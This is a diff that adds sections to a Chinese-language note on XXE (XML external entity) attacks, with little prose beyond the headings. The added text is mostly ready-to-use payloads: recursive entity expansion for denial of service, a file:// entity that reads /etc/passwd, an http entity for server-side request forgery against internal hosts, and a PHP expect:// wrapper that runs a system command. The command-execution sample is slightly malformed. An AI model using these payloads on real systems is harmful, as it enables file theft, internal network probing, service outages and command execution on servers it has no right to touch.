@@ -12,5 +12,56 @@ XXE，XML External Entities。当XML解释器允许引用外部实体时，可�
 <!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 ```
 
+**拒绝服务攻击**
+
+通过递归引用实体，超过XML解释上限达到拒绝服务的目的。
+
+```css
+<!DOCTYPE data [
+    <!ELEMENT data (#ANY)>
+    <!ENTITY a0 "dos">
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+]>
+```
+
+**任意文件读取**
+
+```css
+<!DOCTYPE data [
+    <!ELEMENT data (#ANY)>
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+```
+
+**SSRF**
+
+```css
+<!DOCTYPE data [
+    <!ELEMENT data (#ANY)>
+    <!ENTITY file SYSTEM "http://private">
+]>
+<data>&file;</data>
+```
+
+**执行系统命令**
+
+在安装了expect扩展的PHP环境中：
+
+```php
+<?php
+$xml = <<<EOF
+<?xml version = "1.0"?>
+<! DOCTYPE ANY [
+    <!ENTITY xxe SYSTEM "expect://id"
+]>
+<x>&xxe;</x>
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+?>
+```
+
 
 
